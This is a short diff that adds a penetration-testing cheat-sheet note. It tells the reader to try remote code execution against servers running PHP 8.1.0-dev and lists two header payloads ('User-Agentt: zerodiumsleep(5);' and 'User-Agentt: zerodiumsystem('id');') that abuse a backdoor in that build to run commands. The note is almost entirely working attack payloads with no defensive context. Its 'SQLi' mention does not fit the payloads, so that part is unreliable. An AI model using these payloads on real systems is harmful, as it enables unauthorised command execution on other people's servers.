@@ -1,0 +1,6 @@
+If you find PHP 8.1.0-dev then try RCE & SQLi
+User-Agentt: zerodiumsleep(5);
+User-Agentt: zerodiumsystem('id');
+
+
+  
